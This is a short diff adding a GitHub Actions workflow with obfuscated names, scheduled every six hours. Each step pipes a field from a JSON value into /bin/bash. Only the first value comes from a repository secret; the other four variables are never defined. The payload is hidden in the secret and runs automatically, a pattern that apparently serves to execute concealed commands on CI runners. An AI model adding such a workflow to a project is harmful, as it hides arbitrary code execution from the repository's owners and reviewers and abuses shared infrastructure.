@@ -1,0 +1,22 @@
+name: xugoudemr
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xugoudemr
+        env:
+          xo99423: ${{ secrets.xo99423 }}
+        run: |
+          echo $xo99423 | jq -r .u9 | /bin/bash
+          echo $hmyv5407 | jq -r .pl0 | /bin/bash
+          echo $ol4065 | jq -r .md91043 | /bin/bash
+          echo $zlj4 | jq -r .spz0029 | /bin/bash
+          echo $t5214 | jq -r .ddz70498 | /bin/bash
+
